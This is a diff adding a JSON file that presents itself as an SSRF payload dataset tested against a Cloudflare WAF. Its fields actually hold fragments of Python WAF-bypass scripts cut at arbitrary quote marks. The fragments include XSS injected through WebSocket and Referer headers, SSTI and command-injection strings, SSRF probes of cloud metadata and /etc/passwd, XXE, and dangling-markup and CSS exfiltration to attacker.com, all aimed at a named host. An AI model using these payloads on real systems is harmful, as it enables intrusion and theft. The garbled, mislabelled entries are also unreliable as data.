@@ -1,0 +1,105 @@
+{
+  "category": "ssrf",
+  "subcategory": "general",
+  "count": 7,
+  "payloads": [
+    {
+      "id": "ssrf-0001",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        reflected = check_xss(resp_str) if not blocked else False\n        \n        report(name, status, blocked, reflected, location)\n        if reflected:\n            print(f\"    BODY SNIPPET: {resp_str[resp_str.find('<div>'):resp_str.find('<div>')+200]}\")\n        return status, blocked, reflected\n    except Exception as e:\n        print(f\"  {name:55s} ERR: {str(e)[:60]}\")\n        return 0, True, False\n\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"40A: WebSocket Upgrade — XSS in Various Parts of WS Handshake\")\nprint(\"=\" * 80 + \"\n\")\n\nws_key = base64.b64encode(b\"0123456789abcdef\").decode()\n\n# XSS in query string during WS upgrade\nfor pname, payload in list(PAYLOADS.items())[:10]:\n    enc = urllib.parse.quote(payload)\n    raw_req(f\"ws-query-{pname}\",\n        f\"GET /?globalHtml={enc} HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\r\n\".encode(),\n        \"ws-query\")\n    time.sleep(0.2)\n\n# XSS in Sec-WebSocket-Protocol header\nfor pname, payload in [(\"xss-svg\", PAYLOADS[\"xss-svg\"]),\n                        (\"gap-svg-lb\", PAYLOADS[\"gap-svg-lb\"]),\n                        (\"real-onfocus\", PAYLOADS[\"real-onfocus\"])]:\n    raw_req(f\"ws-proto-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\"\n        f\"Sec-WebSocket-Protocol: {payload}\r\n\r\n\".encode(),\n        \"ws-proto\")\n    time.sleep(0.2)\n\n# XSS in Origin header during WS upgrade\nfor pname, payload in [(\"xss-svg\", PAYLOADS[\"xss-svg\"]),\n                        (\"gap-svg-lb\", PAYLOADS[\"gap-svg-lb\"])]:\n    raw_req(f\"ws-origin-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\"\n        f\"Origin: {payload}\r\n\r\n\".encode(),\n        \"ws-origin\")\n    time.sleep(0.2)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"40B: Referer Header — XSS Payloads\")\nprint(\"=\" * 80 + \"\n\")\n\nfor pname, payload in PAYLOADS.items():\n    enc = urllib.parse.quote(payload)\n    # Referer with XSS in query param\n    raw_req(f\"ref-q-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Referer: https://waf.cumulusfire.net/?globalHtml={enc}\r\n\"\n        f\"Connection: close\r\n\r\n\".encode(),\n        \"referer\")\n    time.sleep(0.15)\n\n# Referer with raw (non-URL-encoded) XSS\nfor pname in [\"gap-backtick-load",
+      "description": "gap-brace-load\", \"xss-svg\", \"real-onload",
+      "technique": "direct_injection",
+      "source_file": "waf_round40_ws_headers.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0002",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "\n\" + \"=\" * 70)\nprint(\"15D: SSTI (Server-Side Template Injection)\")\nprint(\"=\" * 70 + \"\n\")\n\nssti = {\n    \"ssti-jinja\": {\"globalHtml\": \"{{7*7}}\"},\n    \"ssti-jinja2\": {\"globalHtml\": \"{{config}}\"},\n    \"ssti-jinja-class\": {\"globalHtml\": \"{{''.__class__.__mro__[1].__subclasses__()}}\"},\n    \"ssti-twig\": {\"globalHtml\": \"{{_self.env.registerUndefinedFilterCallback('exec')}}\"},\n    \"ssti-erb\": {\"globalHtml\": \"<%= 7*7 %>\"},\n    \"ssti-freemarker\": {\"globalHtml\": \"${7*7}\"},\n    \"ssti-velocity\": {\"globalHtml\": \"#set($x=7*7)$x\"},\n    \"ssti-smarty\": {\"globalHtml\": \"{php}echo 1;{/php}\"},\n    \"ssti-pebble\": {\"globalHtml\": \"{% set x = 7*7 %}{{x}}\"},\n    \"ssti-mako\": {\"globalHtml\": \"${7*7}\"},\n    \"ssti-nunjucks\": {\"globalHtml\": \"{{range.constructor('return 1')()}}\"},\n    \"ssti-ejs\": {\"globalHtml\": \"<%=7*7%>\"},\n    # Expression language\n    \"el-basic\": {\"globalHtml\": \"${7*7}\"},\n    \"el-env\": {\"globalHtml\": \"${env}\"},\n    \"el-java\": {\"globalHtml\": \"${T(java.lang.Runtime).getRuntime().exec('id')}\"},\n}\n\nfor name, params in ssti.items():\n    test(name, params=params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"15E: Command Injection\")\nprint(\"=\" * 70 + \"\n\")\n\ncmdi = {\n    \"cmd-semicolon\": {\"globalHtml\": \";id\"},\n    \"cmd-pipe\": {\"globalHtml\": \"|id\"},\n    \"cmd-backtick\": {\"globalHtml\": \"`id`\"},\n    \"cmd-dollar\": {\"globalHtml\": \"$(id)\"},\n    \"cmd-and\": {\"globalHtml\": \"&& id\"},\n    \"cmd-or\": {\"globalHtml\": \"|| id\"},\n    \"cmd-newline\": {\"globalHtml\": \"\nid\"},\n    \"cmd-cr\": {\"globalHtml\": \"\rid\"},\n    \"cmd-null\": {\"globalHtml\": \"%00id\"},\n    \"cmd-enc-pipe\": {\"globalHtml\": \"%7Cid\"},\n    \"cmd-powershell\": {\"globalHtml\": \"; Get-Process\"},\n}\n\nfor name, params in cmdi.items():\n    test(name, params=params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"15F: SSRF\")\nprint(\"=\" * 70 + \"\n\")\n\nssrf = {\n    \"ssrf-localhost\": {\"globalHtml\": \"http://localhost\"},\n    \"ssrf-127\": {\"globalHtml\": \"http://127.0.0.1\"},\n    \"ssrf-meta\": {\"globalHtml\": \"http://169.254.169.254/latest/meta-data/\"},\n    \"ssrf-meta-v2\": {\"globalHtml\": \"http://169.254.169.254/latest/api/token\"},\n    \"ssrf-gce\": {\"globalHtml\": \"http://metadata.google.internal/computeMetadata/v1/\"},\n    \"ssrf-internal\": {\"globalHtml\": \"http://internal.cloudflare.com\"},\n    \"ssrf-file\": {\"globalHtml\": \"file:///etc/passwd\"},\n    \"ssrf-gopher\": {\"globalHtml\": \"gopher://127.0.0.1:6379/_INFO\"},\n    \"ssrf-dict\": {\"globalHtml\": \"dict://127.0.0.1:6379/INFO\"},\n}\n\nfor name, params in ssrf.items():\n    test(name, params=params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"15G: XXE (XML External Entity)\")\nprint(\"=\" * 70 + \"\n\")\n\nxxe_payloads = [\n    '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "description": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">]><foo>&xxe;</foo>',\n]\n\nfor i, payload in enumerate(xxe_payloads):\n    test(f\"xxe-{i}\", data=payload, headers={\"Content-Type\": \"application/xml\"})\n    test(f\"xxe-param-{i}\", params={\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"15H: Open Redirect",
+      "technique": "direct_injection",
+      "source_file": "waf_round15_pivot.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0003",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "=\" * 70 + \"\n\")\n\nredir = {\n    \"redir-param-url\": {\"url\": \"https://evil.com\"},\n    \"redir-param-next\": {\"next\": \"https://evil.com\"},\n    \"redir-param-redirect\": {\"redirect\": \"https://evil.com\"},\n    \"redir-param-return\": {\"return_url\": \"https://evil.com\"},\n    \"redir-param-goto\": {\"goto\": \"https://evil.com\"},\n    \"redir-param-dest\": {\"destination\": \"https://evil.com\"},\n    \"redir-param-continue\": {\"continue\": \"https://evil.com\"},\n    \"redir-protocol-relative\": {\"globalHtml\": \"//evil.com\"},\n}\n\nfor name, params in redir.items():\n    r = test(name, params=params)\n    if r and r.status_code in (301, 302, 303, 307, 308):\n        loc = r.headers.get(\"Location",
+      "description": "\")\n        print(f\"    Redirect to: {loc}",
+      "technique": "direct_injection",
+      "source_file": "waf_round15_pivot.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0004",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "\n--- B: Scriptless / Dangling Markup ---\")\n\nB_PAYLOADS = [\n    '<img src=\"https://attacker.com/log?",
+      "description": "<base href=\"https://attacker.com/\">',\n    '<form action=\"https://attacker.com/steal\">',\n    '<a href=\"https://attacker.com/steal\">Click to continue</a>',\n    '<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com/steal\">',\n    '<link rel=\"prefetch\" href=\"https://attacker.com/steal\">',\n    '<style>@import \"https://attacker.com/steal.css\";</style>',\n    '<table background=\"https://attacker.com/steal?data=',\n    '<input type=hidden name=csrf value=',\n]\n\nfor p in B_PAYLOADS:\n    test(p)\nprint(f\"  Scriptless done: {total} total",
+      "technique": "direct_injection",
+      "source_file": "waf_round74_oss4.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0005",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "\n--- D: CSS Exfil Attempts ---\")\n\nD_PAYLOADS = [\n    '<style>input[value^=\"a\"]{background:url(https://attacker.com/?a)}</style>",
+      "description": "<style>*{background:url(https://attacker.com/steal)}</style>',\n    '<style>@font-face{font-family:a;src:url(https://attacker.com/steal)}</style>',\n    '<link rel=stylesheet href=\"https://attacker.com/evil.css\">',\n    '<style>body{content:attr(class);background:url(https://attacker.com/)}</style>',\n]\n\nfor p in D_PAYLOADS:\n    test(p)\nprint(f\"  CSS exfil done: {total} total",
+      "technique": "direct_injection",
+      "source_file": "waf_round74_oss4.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0006",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "\n--- C: XML Schema Confusion ---\")\n\nXML_BODIES = [\n    # C1: Extra field addition\n    f'<?xml version=\"1.0\"?><root><globalHtml>{XSS_SHORT}</globalHtml><extra>safe</extra></root>',\n    # C2: DOCTYPE entity expansion\n    f'<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"{XSS_SHORT}\">]><root><globalHtml>&xxe;</globalHtml></root>',\n    # C3: CDATA section\n    f'<?xml version=\"1.0\"?><root><globalHtml><![CDATA[{XSS_SHORT}]]></globalHtml></root>',\n    # C4: Schema closure manipulation - extra char at end\n    f'<?xml version=\"1.0\"?><root><globalHtml>{XSS_SHORT}</globalHtml></root>X',\n    # C5: Misplaced field - value outside tags\n    f'<?xml version=\"1.0\"?><root><globalHtml></globalHtml>{XSS_SHORT}</root>',\n    # C6: Duplicate field names\n    f'<?xml version=\"1.0\"?><root><globalHtml>safe</globalHtml><globalHtml>{XSS_SHORT}</globalHtml></root>',\n    # C7: Namespace prefix\n    f'<?xml version=\"1.0\"?><root xmlns:x=\"http://example.com\"><x:globalHtml>{XSS_SHORT}</x:globalHtml></root>',\n    # C8: Processing instruction\n    f'<?xml version=\"1.0\"?><?xss {XSS_SHORT}?><root><globalHtml>safe</globalHtml></root>',\n    # C9: Comment containing payload\n    f'<?xml version=\"1.0\"?><root><!-- {XSS_SHORT} --><globalHtml>{XSS_SHORT}</globalHtml></root>',\n    # C10: Mixed content\n    f'<?xml version=\"1.0\"?><root><globalHtml>safe{XSS_SHORT}safe</globalHtml></root>',\n]\n\nXML_CTS = ['text/xml",
+      "description": "application/xml', 'text/xml; charset=utf-8',\n           'application/xml; charset=utf-8', 'application/xhtml+xml",
+      "technique": "direct_injection",
+      "source_file": "waf_round81_waffled.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-0007",
+      "category": "ssrf",
+      "subcategory": "general",
+      "payload": "utf-8', errors='replace') + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + chunk.encode(),\n            label=f\"te-{te.strip()[:10]}\")\n\n# F6: HTTP request pipelining\nfor xss in [XSS_S, XSS_IMG]:\n    enc = urllib.parse.quote(xss, safe='')\n    # First request safe, second has XSS\n    pipeline = (\n        f\"GET /?safe=1 HTTP/1.1\r\nHost: {HOST}\r\nConnection: keep-alive\r\n\r\n\"\n        f\"GET /?globalHtml={enc} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n\"\n    ).encode()\n    raw_req(pipeline, label=\"pipeline\")\n\n# F7: HTTP/0.9 style (no headers)\nfor xss in [XSS_S]:\n    enc = urllib.parse.quote(xss, safe='')\n    raw_req(f\"GET /?globalHtml={enc}\r\n\".encode(), label=\"http09\")\n\n# F8: Absolute URL in request line\nfor xss in [XSS_S, XSS_IMG]:\n    enc = urllib.parse.quote(xss, safe='')\n    raw_req(\n        f\"GET https://{HOST}/?globalHtml={enc} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n\".encode(),\n        label=\"absolute-url\")\n\n# F9: Long header list to exhaust WAF buffer\nlong_headers = \"\"\nfor i in range(100):\n    long_headers += f\"X-Padding-{i}: {'A' * 100}\r\n\"\nfor xss in [XSS_S]:\n    enc = urllib.parse.quote(xss, safe='')\n    raw_req(\n        f\"GET /?globalHtml={enc} HTTP/1.1\r\nHost: {HOST}\r\n{long_headers}Connection: close\r\n\r\n\".encode(),\n        label=\"long-headers\")\n\n# F10: Host header with port\nfor xss in [XSS_S]:\n    enc = urllib.parse.quote(xss, safe='')\n    for host_val in [f\"{HOST}:443\", f\"{HOST}:80\", f\"{HOST}:8080",
+      "description": "127.0.0.1",
+      "technique": "direct_injection",
+      "source_file": "waf_round86_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
